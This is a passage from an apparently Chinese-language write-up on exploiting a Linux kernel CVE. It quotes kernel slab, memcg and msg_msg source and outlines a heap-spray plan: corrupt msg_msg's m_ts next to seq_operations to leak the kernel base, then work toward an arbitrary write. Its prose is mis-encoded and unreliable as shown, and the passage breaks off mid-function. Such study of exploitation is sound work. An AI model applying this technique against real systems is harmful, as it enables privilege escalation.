class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">kmem_caches_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span> <span class="title">refcnt</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*work_fn)(struct kmem_cache *);</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯é¦–å…ˆä¼šå­˜æ”¾ä¸€ä¸ªæ ¹slabçš„æŒ‡é’ˆï¼Œåœ¨<code>memcg_caches</code>è¿™é‡Œå­˜æ”¾è‹¥å¹²ä¸ªå­<code>memcg slab</code>ç®¡ç†ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">entries</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´å…¶å¯ä»¥é€šè¿‡æ ¹slabå’Œå­slabäº’ç›¸å¯»æ‰¾ã€‚åœ¨ä¸Šé¢è¿™é‡Œç»“æ„ä½“çš„å®šä¹‰ä¸­<code>entries</code>å°±æ˜¯ç”¨äºå­˜æ”¾<code>memcg slab</code>çš„æ•°ç»„ã€‚æ‰€ä»¥å¯ä»¥ç†è§£ä¸ºæ¯ä¸€ä¸ªæ ¹slabç®¡ç†ç»“æ„(æ ¹slabç®¡ç†ç»“æ„æ ¹æ®å¤§å°åˆ†ç±»)éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å­memcg slabåˆ—è¡¨ã€‚</p><p>ä¸Šé¢å¤šä¸ºç†è®ºä¸­çš„å†…å®¹ï¼Œä¸‹é¢è®¨è®ºä¸€ä¸‹åœ¨å®é™…é¢å¯¹æ—¶æ‰€é‡åˆ°çš„é—®é¢˜ï¼š</p><p>åœ¨è¿™ä¸ªCVEä¸­ï¼Œæ‰€ä½¿ç”¨çš„æ‰€æœ‰åˆ†é…å¯¹è±¡çš„å‡½æ•°éƒ½ä¸º<code>kmalloc</code>é‚£ä¹ˆè¿™é‡Œå…ˆä»è¿™é‡Œçœ‹èµ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SLOB</span></span><br><span class="line">index = kmalloc_index(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!index)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmem_cache_alloc_trace(</span><br><span class="line">kmalloc_caches[kmalloc_type(flags)][index],</span><br><span class="line">flags, size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢åœ¨åˆ†ä¸ºäº†ä¸¤æ¡åˆ†æ”¯ï¼Œæ ¹æ®çš„æ˜¯sizeæ˜¯å¦ä¸ºå®šé‡ï¼Œé‚£ä¹ˆæ ¹æ®è¿™ä¸ªcveæ­£å¥½ä¼šåˆ†åˆ«è¿›å…¥ä¸Šé¢çš„ä¸¤æ¡åˆ†æ”¯ä¸­ã€‚åœ¨åˆ†é…<code>msg_msg</code>æ—¶ä¼šè¿›å…¥åˆ°ä¸‹é¢çš„<code>__kmalloc</code>å‡½æ•°ä¸­ï¼Œåœ¨åˆ†é…<code>ctx-&gt;legacy_data</code>æ—¶åˆ™ä¼šè¿›å…¥åˆ°ä¸Šé¢çš„åˆ†æ”¯ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"><span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">ret = slab_alloc(s, flags, _RET_IP_);</span><br><span class="line"></span><br><span class="line">trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦å…³æ³¨ä¸‹é¢çš„<code>__kmalloc</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä¼šå…ˆè¿›å…¥åˆ°<code>kmalloc_slab</code>è·å–å¯¹åº”çš„<code>slab</code>ï¼Œå…¶å®æ ¹æ®åŠ¨æ€è°ƒè¯•çš„ç»“æœçœ‹åˆ°çš„æ˜¯è¿™é‡Œçš„slabä¸åˆ†é…<code>ctx-&gt;legacy_data</code>æ—¶è¿›å…¥<code>kmem_cache_alloc_trace</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€è‡´çš„æ‰€ä»¥æˆ‘å½“æ—¶å°±å¾ˆè¿·æƒ‘ï¼Œéšå³è¯·æ•™äº†a3åˆçœ‹äº†ä¸€ä¸‹<code>linux kernel 5.9</code>çš„commitæ‰çŸ¥é“ä¼šåœ¨<code>slab_alloc</code>å‡½æ•°ä¸­å‡ºç°é—®é¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line"> unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">page = c-&gt;page;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">object, tid,</span><br><span class="line">next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)</span><br><span class="line"><span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯å¯¹<code>slab_alloc_node</code>å‡½æ•°çš„å¥—å¨ƒæ“ä½œï¼Œç„¶è€Œ<code>slab_alloc_node</code>å‡½æ•°å†…éƒ¨é¦–å…ˆä¼šè°ƒç”¨<code>slab_pre_alloc_hook</code>å‡½æ•°ï¼Œèµ·å…ˆå¹¶æœªæ³¨æ„åˆ°å…¶è¿”å›å€¼ä¹Ÿæ˜¯sæ‰€ä»¥å¹¶æœªå½“å›äº‹ï¼Œé‚£ä¹ˆç°åœ¨è¯¦ç»†åˆ†æä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache *<span class="title">slab_pre_alloc_hook</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">flags &amp;= gfp_allowed_mask;</span><br><span class="line"></span><br><span class="line">fs_reclaim_acquire(flags);</span><br><span class="line">fs_reclaim_release(flags);</span><br><span class="line"></span><br><span class="line">might_sleep_if(gfpflags_allow_blocking(flags));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_failslab(s, flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp;</span><br><span class="line">    ((flags &amp; __GFP_ACCOUNT) || (s-&gt;flags &amp; SLAB_ACCOUNT)))</span><br><span class="line"><span class="keyword">return</span> memcg_kmem_get_cache(s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€åä¼šåˆ¤æ–­æ˜¯å¦å¼€å¯äº†<code>memcg</code>é€‰é¡¹ï¼Œå¹¶æ£€æµ‹è°ƒç”¨æ—¶çš„flagsï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯åœ¨è¿™ä¸ªä½ç½®å¯¼è‡´slabæ”¹å˜äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">memcg_kmem_get_cache</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">memcg_cachep</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_array</span> *<span class="title">arr</span>;</span></span><br><span class="line"><span class="keyword">int</span> kmemcg_id;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!is_root_cache(cachep));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_bypass())</span><br><span class="line"><span class="keyword">return</span> cachep;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(current-&gt;active_memcg))</span><br><span class="line">memcg = current-&gt;active_memcg;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">memcg = mem_cgroup_from_task(current);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!memcg || memcg == root_mem_cgroup)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">kmemcg_id = READ_ONCE(memcg-&gt;kmemcg_id);</span><br><span class="line"><span class="keyword">if</span> (kmemcg_id &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">arr = rcu_dereference(cachep-&gt;memcg_params.memcg_caches);</span><br><span class="line"></span><br><span class="line">memcg_cachep = READ_ONCE(arr-&gt;entries[kmemcg_id]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!memcg_cachep))</span><br><span class="line">memcg_schedule_kmem_cache_create(memcg, cachep);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (percpu_ref_tryget(&amp;memcg_cachep-&gt;memcg_params.refcnt))</span><br><span class="line">cachep = memcg_cachep;</span><br><span class="line">out_unlock:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">return</span> cachep;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥å‡½æ•°å†…éƒ¨æŸ¥çœ‹ä¼šå‘ç°å…¶å°±æ˜¯å¯¹é¢å¤–çš„ç»“æ„ä½“åšçš„ä¸€ç³»åˆ—æ“ä½œ</p><h3 id="msg-msg"><a href="#msg-msg" class="headerlink" title="msg_msg"></a>msg_msg</h3><p>è‡³æ­¤å¯ä»¥å¼€å§‹è®¤çœŸåˆ†æå…³äºæ­¤åˆ©ç”¨æ–¹æ³•äº†ï¼Œé¦–å…ˆè€ƒè™‘çš„æ˜¯å¦‚ä½•å®ç°æ³„æ¼å†…æ ¸åœ°å€ã€‚æˆ‘ä»¬çŸ¥é“<code>msg_msg</code>ç»“æ„ä½“å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>next</code>æŒ‡é’ˆæŒ‡å‘çš„æ˜¯<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œè€Œè¿™ä¸ªç»“æ„ä½“åœ¨å‰é¢çš„æ–‡ç« ä¸­æåˆ°è¿‡ï¼Œå½“æˆ‘ä»¬å‘é€çš„æ¶ˆæ¯å¤§å°å¤§äº<code>0xfd0</code>æ—¶å°†è¶…å‡ºèŒƒå›´çš„å†…å®¹è¡¥å……åˆ°<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œæ€»ä½“ç»“æ„å°±æ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨çš„ç»“æ„ã€‚è¿™é‡Œé€‰æ‹©çš„åŠæ³•è‚¯å®šä¸èƒ½æ˜¯å†…å­˜æœç´¢ï¼Œè¿™æ ·å­˜åœ¨çš„é—®é¢˜å¤ªå¤šäº†ï¼Œå¾ˆå®¹æ˜“é€ æˆ<code>kernel panic</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line">msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">pseg = &amp;msg-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line">seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">*pseg = seg;</span><br><span class="line">seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">pseg = &amp;seg-&gt;next;</span><br><span class="line">len -= alen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³æ³¨<code>msg_msgseg</code>ç»“æ„ä½“çš„åˆ†é…è¿‡ç¨‹å¯ä»¥çŸ¥é“çš„æ˜¯åœ¨Linux kernel 5.4ç‰ˆæœ¬ä¾æ—§æ˜¯é€šè¿‡æ™®é€šçš„slabç”³è¯·çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„é€‰æ‹©æ˜¯å°½å¯èƒ½å°çš„ç”Ÿæˆ<code>msg_msgseg</code>ç»“æ„ä½“ï¼Œéšåä½¿ç”¨<code>seq_operations</code>ç»“æ„ä½“æ¥æ³„æ¼å‡ºå†…æ ¸åŸºåœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ä»¥å¾€çš„æ–‡ç« ä¸­ä»‹ç»è¿‡è¿™ä¸ªç»“æ„ä½“ï¼Œè¿™é‡Œç®€å•æä¸€ä¸‹ï¼Œè¿™ä¸ªç»“æ„ä½“æ˜¯å†…éƒ¨å…¨ä¸ºå‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œæ‰€ä»¥å¯ä»¥å¾ˆè½»æ¾çš„æ³„æ¼ã€‚æŒ‰ç…§a3çš„åšæ³•ï¼Œè¿™é‡Œæ³„æ¼çš„åŠæ³•æ˜¯åœ¨æ¯ç”Ÿæˆä¸€ä¸ª<code>msg_msgseg</code>æ—¶å°±åˆ†é…ä¸€ä¸ª<code>seq_operations</code>ç»“æ„ä½“ï¼Œåœ¨æœ€åå®Œæˆ<code>msg_msg</code>ç»“æ„ä½“çš„å †å–·ä¹‹ååˆå¤§é‡å †å–·<code>seq_operations</code>ç»“æ„ä½“ï¼Œè¿™æ ·å¯ä»¥å¤§å¤§æé«˜æˆåŠŸç‡ä½¿äºŒè€…æŒ¨åœ¨ä¸€èµ·å†é€šè¿‡ä¿®æ”¹<code>m_ts</code>æˆå‘˜å³å¯å®ç°æ³„æ¼ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦è€ƒè™‘çš„æ˜¯ä»»æ„åœ°å€å†™çš„é—®é¢˜äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="keyword">int</span> err = -EFAULT;</span><br><span class="line"><span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="keyword">if</span> 